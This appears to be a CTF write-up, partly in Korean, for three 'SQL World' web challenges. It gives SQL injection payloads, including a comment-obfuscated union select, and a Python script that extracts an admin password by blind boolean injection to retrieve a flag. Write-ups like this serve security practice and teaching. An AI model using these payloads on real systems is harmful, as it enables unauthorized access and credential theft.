# SQL World

# SQL World 1

**pw=’||1%23**

![Untitled](https://user-images.githubusercontent.com/37824335/223043838-252fb5a6-be8f-453a-bb10-6cb2054f07d5.png)

# SQL World2

**pw=%27//union//select/**/1%23**

![Untitled 1](https://user-images.githubusercontent.com/37824335/223043851-d5501a11-6ab0-4a72-827e-4b9b7beb823b.png)

# SQL World3

```python
import requests
import string

url = "http://web.isangxcaution.xyz:20300/sql3.php"

params = {
    'pw' : ''
}

# 비밀번호 길이 구하기
pw_len = 0
for i in range(1,20):
    params['pw'] = f"' or length(pw)={i}#"
    response = requests.get(url,params=params)
    if(response.text.count("Admin") == 4):
        pw_len = i
        print(f"pw_len : {pw_len}")
        break

# 비밀번호 구하기
pw = ''
for idx in range(1,pw_len+1):
    for char in string.printable:
        int_char = str(ord(char))
        params['pw'] = f"' or ascii(substr(pw,{idx},1))={int_char}#"
        response = requests.get(url,params=params)
        if(response.text.count("Admin") == 4):
            print(params)
            pw += char
            print(f"pw: {pw}")
            break

# 플래그 구하기
params["pw"] = pw
response  = requests.get(url,params=params)
idx = response.text.find('IxC')
print(response.text[idx:idx+34])
```

실행 결과

![Untitled 2](https://user-images.githubusercontent.com/37824335/223043889-c189c006-584d-427e-8d52-acc0c17a8e2d.png)
